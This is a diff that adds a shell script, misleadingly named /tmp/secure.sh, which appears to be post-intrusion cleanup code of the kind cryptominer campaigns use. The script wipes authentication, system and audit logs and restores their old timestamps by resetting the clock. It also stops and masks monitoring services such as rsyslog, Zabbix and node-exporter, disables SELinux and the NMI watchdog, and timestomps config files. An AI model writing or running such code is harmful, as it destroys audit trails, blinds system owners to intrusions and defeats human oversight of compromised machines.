@@ -61,3 +61,87 @@ chmod 444 /usr/bin/chattr
 chmod 444 /bin/chattr
 
 EOF
+
+
+
+cat << 'EOF' > /tmp/secure.sh
+#!/bin/bash
+
+ulimit -n 65535
+
+apt install e2fsprogs -y
+chmod 777 /usr/bin/chattr
+chmod 777 /bin/chattr
+
+
+#=== Process Log files
+LOG_FILES="
+/var/log/auth.log 
+/var/log/secure 
+/var/log/syslog 
+/var/log/messages 
+/var/log/lastlog 
+/var/log/utmp 
+/var/log/btmp 
+/var/log/wtmp
+"
+
+for log_file in $LOG_FILES
+do
+    date_old=$(date -r $log_file +"%Y-%m-%d %H:%M:%S")
+    chattr -iua $log_file
+    rm -rf /var/log/audit/*
+    rm -rf $log_file*
+    touch $log_file
+    chmod ugo-w $log_file
+    chown root.root $log_file
+    bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "$log_file" "$date_old"
+    chattr +ia $log_file    
+done
+
+
+#=== Stop/Disable services
+SERVICES="
+rsyslog.service
+syslog.socket
+systemd-update-utmp.service
+snmpd.service
+node-exporter.service
+zabbix-agent.service
+zabbix-agent2
+telegraf
+alertmanager.service
+watchdogd
+"
+
+for service in $SERVICES
+do
+    systemctl unmask $service
+    systemctl stop $service
+    systemctl disable $service
+    systemctl mask $service
+done
+
+
+#=== Process kernel
+sysctl kernel.nmi_watchdog=0
+echo 'kernel.nmi_watchdog=0' >> /etc/sysctl.conf
+echo '0' > /proc/sys/kernel/nmi_watchdog
+sysctl -w net.ipv4.ip_forward=1
+
+bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/etc/sysctl.conf" "2021-01-22 11:25:00"
+bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/proc/sys/kernel/nmi_watchdog" "2021-01-22 11:25:00"
+
+setenforce 0
+echo SELINUX=disabled > /etc/selinux/config
+bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/etc/selinux/config" "2021-01-22 11:25:00"
+
+rm -rf /etc/rc.d/init.d/watchdogs
+rm -rf /usr/sbin/watchdogs
+chattr -R -ia /usr/bin/watchdogd*
+rm -rf /usr/bin/watchdogd*
+
+chmod 444 /usr/bin/chattr
+chmod 444 /bin/chattr
+
+EOF
